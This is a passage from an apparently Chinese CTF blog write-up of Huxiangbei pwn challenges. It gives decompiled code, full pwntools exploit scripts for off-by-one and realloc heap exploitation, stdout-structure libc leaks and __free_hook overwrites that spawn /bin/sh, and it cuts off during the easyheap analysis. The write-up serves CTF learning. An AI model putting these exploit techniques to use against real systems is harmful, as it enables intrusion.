class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>onegadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4527a</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x26d8</span> <span class="token operator">-</span> <span class="token number">0x110</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'csh'</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>gift<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x45226 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4527a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf0364 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1207 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span></code></pre><p>整体就是通过printf泄露libc地址，然后将rbp伪造成main函数的rbp就能够重新执行程序。</p><h2 id="0x3-only-add"><a href="#0x3-only-add" class="headerlink" title="0x3.only_add"></a>0x3.only_add</h2><p>保护全开</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/5.jpg" alt=""></p><p>一共俩功能，add功能如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_A01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">0x500</span> <span class="token punctuation">)</span>    <span class="token function">sub_9A5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">&amp;&amp;</span> v1 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Data:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>通过realloc申请最大0x500的chunk，并且存在<code>off-by-one</code>，并且当前只能存在一个chunk</p><p>第二个功能如下</p><pre class=" language-c"><code class="language-c">__int64 <span class="token function">sub_9BF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_202010<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_202010 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Bye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    buf <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">--</span>dword_202010<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>清除buf，即清除堆地址，然后关闭标准输出。</p><p>realloc函数根据不同的情况有不同的功能</p><pre class=" language-c"><code class="language-c"><span class="token function">realloc</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">.</span>ptr <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token number">2</span><span class="token punctuation">.</span>ptr <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> size <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span> <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">.</span>ptr <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> size <span class="token operator">==</span> old_size <span class="token punctuation">:</span> <span class="token function">edit</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">.</span>ptr <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> size <span class="token operator">&lt;</span> old_size <span class="token punctuation">:</span> <span class="token function">edit</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> and <span class="token function">free</span><span class="token punctuation">(</span>remainder<span class="token punctuation">)</span><span class="token number">4</span><span class="token punctuation">.</span>ptr <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> size <span class="token operator">></span> old_size <span class="token punctuation">:</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>new_ptr<span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> new_ptr</code></pre><p>这题改堆风水改到头疼，先贴上exp吧，1/16的几率</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Data:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_no</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:\n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free_no</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x488</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x418</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x4a8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x438</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x418</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x488</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x418</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x3e0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x5760</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p16<span class="token punctuation">(</span><span class="token number">0x5760</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>                    <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ed8b0</span>    <span class="token keyword">if</span> libc_base <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">0x3ed8b0</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>        free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        init<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0xb8</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0xb8</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x218</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">31</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token number">-8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token number">-8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        add_no<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        free_no<span class="token punctuation">(</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'exec 1>&amp;2'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#gdb.attach(io)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x4f2c5 execve("/bin/sh", rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve("/bin/sh", rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a38c execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span></code></pre><p>就不一步步调了。。。再调就裂开了，讲讲整体思路吧</p><p>首先没有libc地址，肯定得泄露libc地址的，也没有show，自然得通过改<code>stdout</code>结构体来泄露libc地址，这样我们就需要将<code>main_arena</code>地址落到某个<code>tcache</code>的<code>fd</code>位上，然后修改其后四位以此来申请到<code>stdout</code>结构体。如何获得<code>main_arena</code>地址呢，这题也没有<code>free</code>函数，这就需要利用到<code>realloc</code>的free功能了，我们先申请一个大chunk，比如<code>0x448</code>大小的，然后继续申请<code>0x418</code>大小的，由于<code>realloc</code>的指针没变，所以直接在原<code>0x448</code>大小的<code>chunk</code>上切割下来一块<code>0x420</code>大小的<code>chunk</code>，剩下的<code>0x30</code>的<code>chunk</code>就会被<code>free</code>掉丢入<code>tcache</code>中，接着我们再申请0字节大小的<code>chunk</code>，也就是<code>realloc(ptr,0)</code>，这就相当于<code>free</code>功能，这样这块<code>0x420</code>大小的<code>chunk</code>就会被丢入<code>unsorted bin</code>中，<code>main_arena</code>地址到手。</p><p>有了<code>main_arena</code>地址地址，我们还需要构造堆重叠，这样我们才可以修改tcache的fd，如何构造出堆重叠？自然就需要<code>off-by-one</code>功能了，我们通过<code>unsorted bin</code>上方的一个<code>chunk</code>来改大<code>unsorted bin</code>的size，把它物理高地址的一个<code>tcache</code>给包进来，然后把这个修改之后的大<code>chunk</code>给申请过来就可以了，这样我们就获得了一个一个还在<code>free</code>状态的<code>tcache</code>，然后通过一次次申请chunk，把main_arena放到tcache的fd中，再修改其fd的后四位为<code>_IO_2_1_STDOUT_</code>结构体地址的后四位。</p><p>修改fd成功之后会变成如下状态</p><p><img src="/LawlietLW.github.io/2020/11/02/hu-xiang-bei/hu-xiang-bei-pwn-ti-jie/6.jpg" alt=""></p><p>这个时候我们再<code>add</code>一次<code>0x68</code>的<code>chunk</code>，<code>0x70</code>这条链的tcache就只剩下<code>stdout</code>了，但我们想要申请一个新的<code>chunk</code>，就需要先free掉上一个chunk，如果我们直接free掉我们刚刚申请的那个0x70的chunk，0x70的tcache就又会变成两个，这样只能眼巴巴地看着stdout。</p><p>但如果我们将我们刚刚申请的chunk减小，也就是利用realloc的切割功能，把它从0x70切割成0x50或者别的值，free之后这个chunk就会链到别的大小的tcache中，这时我们再申请chunk就能申请到stdout了。</p><p>修改完stdout之后，我们再申请新chunk之前需要使用功能二，清空buf，否则dele stdout会报错。</p><p>之后就是重复上面的步骤，将chunk分配到<code>free_hook-8</code>,将<code>free_hook-8</code>修改为<code>/bin/sh\x00</code>,将<code>free_hook</code>修改为<code>system</code>，然后free即可。</p><p>再就是由于功能二关闭了标准输出，所以在拿到shell之后我们需要将标准输出重定位到标准输入</p><p>讲的可能有些不清楚，调一遍应该能清楚很多了。</p><h2 id="0x4-easyheap"><a href="#0x4-easyheap" class="headerlink" title="0x4.easyheap"></a>0x4.easyheap</h2><p>保护全开</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp+0h] BYREF</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>        <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>        <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>        <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>        <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>增删查改都有</p><p>问题出在show和dele功能</p><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"index?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>show功能存在越界读，可以泄露libc地址和程序加载基地址</p><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token 